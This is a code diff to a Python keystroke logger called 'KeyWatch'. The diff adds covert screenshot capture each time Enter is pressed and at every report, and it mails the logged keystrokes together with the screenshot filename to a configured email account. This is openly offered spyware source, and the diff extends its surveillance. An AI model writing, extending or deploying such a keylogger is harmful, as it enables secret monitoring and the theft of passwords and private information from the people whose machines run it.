@@ -4,6 +4,7 @@ import threading
 import smtplib 
 from datetime import datetime
 from pynput.keyboard import Key
+import mss
 
 ### 🛠️ Project: KeyWatch – Advanced Keystroke Logger
 
@@ -26,18 +27,39 @@ class Kelogger:
               self.log += " "
           elif key == Key.enter:
               self.log += "\n"
+              self.take_screenshot()
           elif key == Key.tab:
               self.log += "\t"
           else:
               self.log += f" [{key.name}] "
+
+  def take_screenshot(self):
+        """Take screenshot and save with timestamp."""
+        timestamp = datetime.now().strftime('%Y-%m-%d_%H-%M-%S')
+        filename = f"screenshot_{timestamp}.png"
+        try:
+            with mss.mss() as sct:
+                sct.shot(output=filename)
+                print(f"[+] Screenshot taken: {filename}")
+        except Exception as e:
+            print(f"[!] Failed to take screenshot: {e}")
+        return filename
+
 
   def report(self):
     if len(self.log) > 0:
       timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
       formatted_log = f"\n[+] Log Time: {timestamp}\n{'-'*40}\n{self.log}\n{'='*40}\n"
 
+      # Take Screenshot
+      screenshot_file = self.take_screenshot()
+
+
+      email_content = f"{formatted_log}\nScreenshot saved as: {screenshot_file}"
+
       # Send via email
-      self.send_mail(self.email, self.password, formatted_log)
+      self.send_mail(self.email, self.password, email_content)
+
 
       # View in Terminal
       print(formatted_log)
@@ -45,6 +67,7 @@ class Kelogger:
       # (optional) Save to local file
       with open(self.LOG_FILE_PATH, "a", encoding="utf-8") as f:
         f.write(formatted_log)
+      
 
     #  Full-time log.
     self.log = ""
